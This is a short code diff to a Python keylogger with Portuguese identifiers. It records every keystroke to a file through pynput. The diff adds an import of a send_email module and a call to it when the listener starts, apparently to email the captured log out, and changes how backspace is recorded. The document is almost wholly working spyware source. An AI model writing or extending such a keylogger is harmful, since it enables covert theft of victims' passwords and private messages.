@@ -1,4 +1,5 @@
 from pynput import keyboard
+import send_email
 
 IGNORAR = {
     keyboard.Key.shift,
@@ -25,7 +26,7 @@ def on_onpress(key):
             elif key == keyboard.Key.tab:
                 f.write("\t")
             elif key == keyboard.Key.backspace:
-                f.write(" ")
+                f.write("[<]")
             elif key == keyboard.Key.esc:
                 f.write("[ESC]")
             elif key in IGNORAR:
@@ -34,5 +35,6 @@ def on_onpress(key):
                 f.write(f"[{key}]")
 
 with keyboard.Listener(on_press=on_onpress) as listener:
+    send_email.enviar_email()
     listener.join()
         
